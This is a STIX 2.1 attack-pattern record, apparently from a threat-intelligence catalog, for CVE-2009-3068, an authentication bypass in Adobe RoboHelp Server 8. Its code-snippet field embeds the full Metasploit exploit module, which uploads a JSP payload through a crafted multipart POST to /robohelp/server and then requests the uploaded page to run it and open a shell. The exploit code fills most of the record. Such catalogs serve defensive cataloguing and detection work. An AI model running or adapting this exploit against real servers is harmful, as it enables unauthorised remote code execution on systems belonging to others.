{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d790479-0d92-46d3-8b54-ee048bbae5be",
    "created": "2024-08-14T16:55:21.770612Z",
    "modified": "2024-08-14T16:55:21.770616Z",
    "name": "Adobe RoboHelp Server 8 Arbitrary File Upload and Execute",
    "description": " This module exploits an authentication bypass vulnerability which allows remote attackers to upload and execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/adobe_robohelper_authbypass.rb",
            "external_id": "adobe_robohelper_authbypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-3068"
        },
        {
            "source_name": "reference",
            "url": "http://www.intevydis.com/blog/?p=69"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Adobe RoboHelp Server 8 Arbitrary File Upload and Execute',\n      'Description'    => %q{\n          This module exploits an authentication bypass vulnerability which\n        allows remote attackers to upload and execute arbitrary code.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'win',\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'CVE', '2009-3068' ],\n          [ 'OSVDB', '57896'],\n          [ 'URL', 'http://www.intevydis.com/blog/?p=69' ],\n          [ 'ZDI', '09-066' ],\n        ],\n      'Targets'        =>\n        [\n          [ 'Universal Windows Target',\n            {\n              'Arch'     => ARCH_JAVA,\n              'Payload'  =>\n                {\n                  'DisableNops' => true,\n                },\n            }\n          ],\n        ],\n      'DefaultOptions' =>\n        {\n          'SHELL' => 'cmd.exe'\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-09-23'\n    ))\n\n    register_options( [ Opt::RPORT(8080) ])\n  end\n\n  def exploit\n\n    page = Rex::Text.rand_text_alpha_upper(8) + \".jsp\"\n    uid  = rand(20).to_s\n\n    file =  \"-----------------------------#{uid}\\r\\n\"\n    file << \"Content-Disposition: form-data; name=\\\"filename\\\"; filename=\\\"#{page}\\\"\\r\\n\"\n    file << \"Content-Type: application/x-java-archive\\r\\n\\r\\n\"\n    file << payload.encoded\n    file << \"\\r\\n\"\n\n    print_status(\"Sending our POST request...\")\n\n    res = send_request_cgi(\n      {\n        'uri'\t\t=> '/robohelp/server',\n        'version'\t=> '1.1',\n        'method'\t=> 'POST',\n        'encode_params' => false,\n        'data'\t\t=> file,\n        'headers'\t=> {\n          'Content-Type'\t\t=> 'multipart/form-data; boundary=---------------------------' + uid,\n          'UID'\t\t\t=> uid,\n        },\n        'vars_get' => {\n          'PUBLISH' => uid\n        }\n      }, 5)\n\n    if ( res and res.message =~ /OK/ )\n      id = res['sessionid'].to_s.strip\n\n      print_status(\"Got sessionid of '#{id}'. Sending our second request to '#{page}'...\")\n      data = send_request_raw({\n          'uri'\t\t=> normalize_uri('robohelp', 'robo','reserved', 'web', id, page),\n          'method'\t=> 'GET',\n          'version'\t=> '1.0'\n      }, 5)\n\n      handler\n    else\n      print_error(\"No SESSIONID acquired...\")\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-09-23",
    "x_mitre_platforms": [
        "win'"
    ]
}